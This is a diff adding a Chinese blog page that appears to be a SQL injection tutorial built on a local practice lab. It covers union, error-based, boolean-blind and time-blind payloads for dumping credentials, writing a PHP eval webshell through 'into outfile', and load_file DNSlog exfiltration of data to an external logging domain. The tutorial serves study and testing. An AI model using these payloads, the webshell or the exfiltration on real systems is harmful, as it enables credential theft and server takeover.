@@ -1,0 +1,478 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SQL 注入 - Autumnal</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="简单数据库操作select1select * from user where id = 1;
+
+select + 列名(* 代表所有) from + 查询表 + where + 查询内容
+上面查询语,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Autumnal" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Autumnal</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">SQL 注入</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">SQL 注入</h1>
+        <div class="stuff">
+            <span>八月 29, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="简单数据库操作"><a href="#简单数据库操作" class="headerlink" title="简单数据库操作"></a>简单数据库操作</h2><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>select + 列名(* 代表所有) from + 查询表 + where + 查询内容</code></p>
+<p>上面查询语句等价于</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="keyword">in</span> (<span class="string">&#x27;1&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>从<code>user</code>表，擦寻所有包含<code>id</code>为<code>1</code>的数据</p>
+<p>同时我们可以使用<code>()</code>提高对应的查询优先级，数据库将会先查询括号内内容，之后再根据括号外的内容进行查询</p>
+<h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">union</span> <span class="keyword">select</span> email_id <span class="keyword">from</span> emails; </span><br></pre></td></tr></table></figure>
+
+<p><code>union</code>会同时查询两个项目，<code>user</code>将会先被查询，随后执行查询<code>emails</code></p>
+<blockquote>
+<p>union 查询有一个限制，前后查询的列数必须要相同</p>
+</blockquote>
+<h3 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> userneme <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以通过<code>group by</code>来进行判断对应表的列数</p>
+<h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>desc</code>是排列顺序变为降序</p>
+<h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>限制为从第一行开始显示三行，数据库中表的行数从 0 开始计数</p>
+<h3 id="and-和-or"><a href="#and-和-or" class="headerlink" title="and 和 or"></a>and 和 or</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>and</code>需要同时满足查询的前后两者关系，<code>or</code>只需要满足其一即可进行查询</p>
+<h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(id,username,password) <span class="keyword">from</span> users; </span><br></pre></td></tr></table></figure>
+
+<p>将我们的查询内容归到一行中</p>
+<h3 id="select-database"><a href="#select-database" class="headerlink" title="select database()"></a>select database()</h3><p>用于查询当前数据库</p>
+<h3 id="select-version"><a href="#select-version" class="headerlink" title="select version()"></a>select version()</h3><p>用于查询当前数据库版本</p>
+<h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><h3 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h3><p>数字型 —— 当输入的参数为整形时，可以认为是数字型注入</p>
+<p>字符型 —— 当输入的参数为字符串时，可以认为是字符型注入</p>
+<h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>注入点就是可以实行注入的地方，通常是一个访问数据库的链接</p>
+<h3 id="如何判断是字符型注入还是数字型注入"><a href="#如何判断是字符型注入还是数字型注入" class="headerlink" title="如何判断是字符型注入还是数字型注入"></a>如何判断是字符型注入还是数字型注入</h3><p>使用<code>and 1=1</code> 和 <code>and 1=2</code>来判断</p>
+<p>当是数字型注入时只有第一个能被执行第二个无法被数据库查询到，网页无法正常显示</p>
+<p>当是字符型注入时两个都可以进行正常显示界面</p>
+<blockquote>
+<p>字符型需要闭合符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;select * from users where id =&#x27;</span><span class="variable">$id</span><span class="string">&#x27; limit 0,1&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>提交<code>1 and 1=1</code>时</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;select * from users where id =&#x27;</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="string">&#x27; limit 0,1&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>单引号闭合语句后<code>Where</code>语句为一个条件<code>id = &#39;1 and 1=1&#39;</code></p>
+<p>数字型则不需要闭合符来闭合</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;select * from users where id = $id limit 0,1&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>提交<code>and 1=2</code>时，将<code>and</code>解析为了一个命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;select * from users where id = $id and 1=2 limit 0,1&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>导致后面的查询出现错误，而不能正常返回</p>
+</blockquote>
+<h3 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h3><p><code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>、<code>&quot;)</code>、<code>其他</code></p>
+<h3 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h3><p>我们可以通过制造报错来进行判断，在测试点输入数据后加上对应的闭合方式进行测试，通过网页的回显来进行判断闭合方式，当程序没有回显时，我们也可以采用加上 <code>--+</code>或<code>#</code>或<code>%23</code>注释符来根据页面的正常显示与否来进行判断</p>
+<h3 id="闭合的作用"><a href="#闭合的作用" class="headerlink" title="闭合的作用"></a>闭合的作用</h3><p>我们手工提交闭合符号，结束前一段的查询，后面即可加入其他语句，来进行查询我们需要的参数</p>
+<h3 id="union-联合注入前基础工作"><a href="#union-联合注入前基础工作" class="headerlink" title="union 联合注入前基础工作"></a>union 联合注入前基础工作</h3><p>我们分析出了对应的闭合方式后我们可以使用<code>group by</code>来判断前面查询语句的列数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; group by 10 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>改变<code>10</code>，多次测试后我们可以得到对应查询的列数，随后我们需要查询回显位，假设我们的列数为<code>3</code>，那么我们使用<code>1,2,3</code>进行占位，来判断回显位</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>一般来说页面只会读取第一行，因此我们<code>id</code>前面的查询数据需要设置一个数，让前面的查询语句没有对应的匹配值，从而只显示我们的后面<code>union</code>对应的查询语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>此时我们执行完后，观察页面的显示，看看是那一部分显示出来的，那么我们便可以更改对应的回显位，来完成我们需要的查找</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database() --+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h2><h3 id="最终目标"><a href="#最终目标" class="headerlink" title="最终目标"></a>最终目标</h3><p>使用<code>union</code>注入拿到数据库中所有的用户名和密码</p>
+<h3 id="拿到表名"><a href="#拿到表名" class="headerlink" title="拿到表名"></a>拿到表名</h3><p><code>information_schema</code>包含了所有<code>mysql</code>数据库的简要信息，其中包含有两个我们需要的数据表<code>tables</code>(表名集合表)和<code>columns</code>(列名集合表)</p>
+<p>我们需要的表名信息在数据库<code>information_schema</code>-&gt;数据表<code>tables</code>-&gt;数据列<code>table_name</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,table_name,3 from information_schema.tables --+</span></span><br></pre></td></tr></table></figure>
+
+<p>过滤在<code>security</code>数据库中的表名，即<code>table_schema</code>为<code>security</code>的行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
+
+<p>因为查询的信息只能显示一个，因此我们需要使用<code>group_concat()</code>确保所有查询到的信息能放到一行显示出来</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name) ,2 from information_schema.tables where table_schema=database()--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="拿到列名"><a href="#拿到列名" class="headerlink" title="拿到列名"></a>拿到列名</h3><p>用相似的方式我们进行获取数据库<code>information_schema</code>-&gt;数据表<code>columns</code>-&gt;数据列<code>column_name</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.column --+</span></span><br></pre></td></tr></table></figure>
+
+<p>通过拿到列名后根据我们已有的信息可以获取到对应的数据库里面的所有用户名与密码信息，我们可以直接进行输出</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span> <span class="string">&#x27;,password) ,2 from users  --+</span></span><br></pre></td></tr></table></figure>
+
+<p>大致总结流程如下：</p>
+<ol>
+<li>确定是数字型还是字符型</li>
+<li>使用<code>group by</code>进行二分判断<code>union</code>语句中前一个查询的列数</li>
+<li>优化语句，将对应查询的内容修改为不存在的内容</li>
+<li>使用<code>select</code>，查询数据库库名</li>
+<li>使用<code>select</code>，查询所有表名</li>
+<li>使用<code>select</code>，查询所有列名</li>
+<li>查询所有用户名密码</li>
+</ol>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入是一种页面响应形式，主要在于后台对于输入输出的合理性没有检查</p>
+<p>对于报错注入，我们需要构造语句让错误信息中夹杂可以显示数据库内容的查询语句，进而让服务器返回报错提示中包含数据库的内容</p>
+<p>常用的方式有<code>floor()</code>、<code>extractvalue</code>、<code>updatexml()</code></p>
+<h3 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue() 报错注入"></a>extractvalue() 报错注入</h3><p><code>extractvalue()</code>通常用于查询对应的<code>xml</code>文件信息的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(xml对象名称,<span class="string">&#x27;路径&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>对于此种方式进行注入时，我们需要关心的是第二个参数，第二个参数当把查询路径写错时不会参数对应的错误信息，但是当我们把路径的<code>&#39;/&#39;</code>改为<code>&#39;~&#39;</code>时便会产生对应的错误信息，但是后续的内容可以被数据库解析，从而查询我们所需要的内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())))</span><br></pre></td></tr></table></figure>
+
+<p>通过这样的方式来拿到我们的查询数据，需要注意的是这样的方式我们仅能返回<code>32</code>个字符长度，为了解决这个方式我们需要使用到一个函数<code>substring()</code></p>
+<p><code>substring()</code>有三个参数：</p>
+<p>第一个参数是对应控制的输出内容，第二个参数是输出的起始下标(注意此处下标起始为 1)，第三个参数是对应的输出长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">substring</span>(extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()))),<span class="number">25</span>,<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml() 报错注入"></a>updatexml() 报错注入</h3><p><code>updatexml()</code>包含三个参数，第一个参数是对应的<code>xml</code>文档名称，第二个参数是<code>xml</code>文档的路径，第三个参数是替换查找到的符合条件的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(xml对象名称,<span class="string">&#x27;路径&#x27;</span>,替换对象)</span><br></pre></td></tr></table></figure>
+
+<p><code>updatexml()</code>的注入方式与<code>extractvalue()</code>相同，都是通过修改对应路径使其发生报错，从而将我们路径后半部分的<code>sql</code>语句查询到的数据进行显示</p>
+<p>这两函数均有一个特性，仅能返回<code>32</code>个字符长度，我们同样可以使用函数<code>substring()</code>来进行解决这个问题</p>
+<h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor() 报错注入"></a>floor() 报错注入</h3><h4 id="相关涉及到的函数"><a href="#相关涉及到的函数" class="headerlink" title="相关涉及到的函数"></a>相关涉及到的函数</h4><p><code>rand()</code>函数：随机返回<code>0 ~ 1</code>间的小数</p>
+<p><code>floor()</code>函数：小数向下取整数，向上取整数<code>ceiling()</code></p>
+<p><code>concat_ws()</code>函数：将括号内数据用第一个字段链接起来</p>
+<blockquote>
+<p>concat_ws(‘-‘,a,b);     -&gt;     a-b</p>
+</blockquote>
+<p><code>as</code>：用于取别名</p>
+<p><code>count()</code>函数：汇总统计数量</p>
+<p><code>limit</code>：用于显示指定行数</p>
+<h3 id="构造方式"><a href="#构造方式" class="headerlink" title="构造方式"></a>构造方式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat_ws(<span class="string">&#x27;-&#x27;</span>,(database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure>
+
+<h4 id="拆解构造"><a href="#拆解构造" class="headerlink" title="拆解构造"></a>拆解构造</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat_ws(<span class="string">&#x27;-&#x27;</span>,(database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> a</span><br></pre></td></tr></table></figure>
+
+<p>上面的命令将我们的<code>database()</code>与<code>floor(rand()*2)</code>用<code>-</code>进行拼接，因为<code>rand()</code>产生的数字在<code>0 ~ 1</code>间，乘以 2 后返回的数字在<code>0 ~ 2</code>间，我们对其进行向下取整，那么返回值就只有 0 和 1 ，我们此处拼接后的数据类型就只有两种，假设我们情况查询到的<code>database()</code>名为<code>user</code>，那么此处返回的两种类型分别为<code>user-0</code>和<code>user-1</code></p>
+<p>随后我们将我们查询到的数据命名为<code>a</code>，随后对<code>a</code>进行分组(得到的数据为两种类型<code>user-0</code>和<code>user-1</code>)</p>
+<p>随后我们使用<code>count()</code>对我们分类后的数据进行统计数目</p>
+<p>当我们执行此条语句时，偶尔会出现报错<code>#1062</code></p>
+<h4 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h4><p>当我们给<code>rand()</code>函数一个固定的<code>seed</code>那么其产生的随机数经过<code>floor(rand()*2))</code>处理后变得是一个固定值，一般我们给定为<code>0</code></p>
+<p>我们可以把<code>count(*)</code>去除，可以发现不会再报错，说明是在统计的时候产生了错误，那么为什么会产生错误信息呢</p>
+<p><code>rand()</code>函数进行分组<code>group by</code>和统计<code>count()</code>时可能会多次执行，导致键值<code>key</code>重复</p>
+<blockquote>
+<p>人话解释：</p>
+<p>我们把<code>floor(rand(0)*2))</code>设置后产生的数列为0、1、1、0、1…</p>
+<p>当开始统计时，<code>group_key</code>[理解为分类的名单]中没有任何的分类方式，我们第一次统计<code>0</code>的时候发现这一点后，<code>group_key</code>需要重新计算并把结果写入键值[相当于此次计算时在创建<code>group_key</code>的一个分类]，此时执行的时第二次计算，而将<code>1</code>写入了<code>group_key</code>中，而第二次统计时<code>group_key</code>以及存在对应键值了，可以直接写入统计数目，当再次写入到<code>0</code>时，需要再次计算，而此时计算的结果是<code>1</code>，但是<code>1</code>的分类已经被创建了，无法再次创建，进而引发报错</p>
+</blockquote>
+<h3 id="一些情况"><a href="#一些情况" class="headerlink" title="一些情况"></a>一些情况</h3><p>有些时候我们注入后会发现原本会报错的注入语句突然正常执行了起来，此时我们可以试试看将<code>group_concat()</code>换成<code>concat()</code>或者<code>concat_ws()</code>，同时也可以加上一个<code>limit</code>将对应的回显行进行修改</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>盲注：页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行拆解，实行<code>SQL</code>注入</p>
+<p>布尔盲注：页面就只有两种状态，一种是为真，一种为假</p>
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><code>ascii()</code>：获取对应字符的<code>ASCII</code>码</p>
+<p><code>substr()</code>：有三个参数，第一个为一个长字符串，第二个为输出字符串的起始位置(从<code>1</code>开始计数)，第三个为控制显示字符的个数</p>
+<h3 id="相关注入方式"><a href="#相关注入方式" class="headerlink" title="相关注入方式"></a>相关注入方式</h3><p>布尔盲注的方式主要是通过不断地尝试来一个个符号的进行爆破，当输入正确的时候网页会回显对应正确信息，通过这个方式进行逐项爆破</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select database() limit 0,1 ),1,1)) &gt; xxx --+</span></span><br></pre></td></tr></table></figure>
+
+<p>我们通过不断的修改<code>xxx</code>的值，直到找到一个值使语句恒能使页面正常显示，此时我们便找到了一个字符，多次进行下去便可以获取到我们想要的信息</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><code>web</code>页面只返回一个正常页面，利用页面响应时间不同，逐个拆解数据</p>
+<blockquote>
+<p>前提是数据库会执行命令代码，只是不反馈页面信息</p>
+</blockquote>
+<h3 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h3><p><code>sleep()</code>：参数仅有一个，对应为休眠时长，以秒为单位，可以为小数</p>
+<p><code>if(a,b,c)</code>：判断<code>a</code>的真假，当<code>a</code>为真时执行<code>b</code>，否则执行<code>c</code></p>
+<h3 id="相关判断"><a href="#相关判断" class="headerlink" title="相关判断"></a>相关判断</h3><p>我们通过页面的返回时间来进行对应的语句判断，我们可以通过<code>网络</code>这个调试组件来进行观察网页的返回时间，判断是否延迟了我们输入的秒数</p>
+<h3 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if(ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">100</span>,sleep(<span class="number">0</span>),sleep(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>
+
+<p>相当于我们利用<code>ascii</code>和<code>substr</code>的组合将第查询到的数据的第一个字母进行返回，同时通过<code>if</code>进行判断，通过这个方式我们可以根据延迟的长短来判断出我们输入的语句是否正确，通过这样的一个个数据的判断，我们可以拿到对应的内容</p>
+<h2 id="SQL-注入文件上传"><a href="#SQL-注入文件上传" class="headerlink" title="SQL 注入文件上传"></a>SQL 注入文件上传</h2><h3 id="相关要点"><a href="#相关要点" class="headerlink" title="相关要点"></a>相关要点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>查看<code>MySQL</code>是否有读写文件权限</p>
+<p>数据库的<code>file</code>权限规定了数据库用户是否有权限，向操作系统内写入和读取已存在的权限</p>
+<p><code>into outfile</code>命令使用的环境：必须知道一个服务器上可以写入文件的文件夹的完整路径</p>
+<h3 id="文件上传指令"><a href="#文件上传指令" class="headerlink" title="文件上传指令"></a>文件上传指令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单的一句话木马</p>
+<p>对目标网站上传指令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>)) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,&quot;&lt;?php @eval($_POST[&#x27;password&#x27;]);?&gt;&quot;,<span class="number">3</span> <span class="keyword">into</span> outfile &quot;XXX\123.php&quot; <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><code>XXX</code>为文件路径，<code>123.php</code>是我们插入的文件名</p>
+<h3 id="文件上传后"><a href="#文件上传后" class="headerlink" title="文件上传后"></a>文件上传后</h3><p>我们执行完上面的语句后会在对应的路径生成一个<code>123.php</code>文件，这个就是我们的后门了，我们通过蚁剑进行链接即可达到控制整个服务器的效果</p>
+<h2 id="DNSlog-手动注入"><a href="#DNSlog-手动注入" class="headerlink" title="DNSlog 手动注入"></a>DNSlog 手动注入</h2><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(&quot;XXX&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><code>XXX</code>为对应文件的路径，此条命令可以去读取对应文件内容，同时显示对应字节</p>
+<h3 id="需要用到的网站"><a href="#需要用到的网站" class="headerlink" title="需要用到的网站"></a>需要用到的网站</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://ceye.io</span><br><span class="line">http://www.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><p>相当于我们加载文件中的一个路径中如果有<code>sql</code>语句则被数据库进行解析后，我们可以通过查看访问对应的<code>DNSlog</code>进行查看，在<code>DNSlog</code>中会显示访问的网站，其中便有已经解析完毕的<code>sql</code>语句，通过这种方式进行查找，便可以获得对应数据库的信息</p>
+<blockquote>
+<p>load_file() 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有 FILE 权限。 该文件所有字节可读，但文件内容必须小于 max_allowed_packet，这个函数也可以用来发送 dns 解析请求，<strong>并且只能在 Windows 平台发起 load_file 请求</strong></p>
+</blockquote>
+<h3 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h3><p>我们可以先在上面两个网站中获取到一个随机的域名，这个域名钱可以加任何内容，对应的访问都会被记录下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zfzyk9.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p>比如我们访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123.zfzyk9.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p>那么对应的网站便会将其进行记录，利用这个特点我们可以进行手动构造注入语句，完成相关的注入过程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(&quot;//&quot;,(<span class="keyword">select</span> database()),&quot;zfzyk9.dnslog.cn/123&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>此时我们回到获取域名的网站观察访问的网站域名</p>
+<p>便可以看到对应的数据库名了，我们只需要对<code>select database()</code>进行修改即可，修改成为我们对应需要的查询语句</p>
+<h2 id="DNSlog-自动化注入"><a href="#DNSlog-自动化注入" class="headerlink" title="DNSlog 自动化注入"></a>DNSlog 自动化注入</h2><h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ADOOO/DnslogSqlinj</span><br><span class="line">pip2 install gevent==1.2.2</span><br><span class="line">pip2 install termcolor</span><br></pre></td></tr></table></figure>
+
